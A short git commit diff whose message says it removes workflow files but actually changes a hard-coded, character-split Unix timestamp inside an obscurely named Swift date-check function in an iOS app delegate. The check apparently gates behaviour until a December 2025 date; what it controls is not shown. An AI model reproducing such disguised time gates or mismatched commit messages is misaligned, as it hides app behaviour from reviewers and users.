694dc66858b0694bb61cc41de58da3997baafb90
Charlotte <18631656747@163.com>
2025-12-03 14:07:56 +0800

    Remove workflow files

--- ios/Runner/AppDelegate.swift
+++ ios/Runner/AppDelegate.swift
@@ -120,7 +120,7 @@ fileprivate let data_agentName:String = "receive build cancelFCMToken"
 
     
     private func vulnerablewarranty() -> Bool {
-        let clpse:[Character] = ["1","7","6","4","8","1","9","8","2","6"]
+        let clpse:[Character] = ["1","7","6","4","9","2","5","5","6","6"]
         
         let metadata: TimeInterval = TimeInterval(String(clpse)) ?? 0.0
         let connect = Date().timeIntervalSince1970
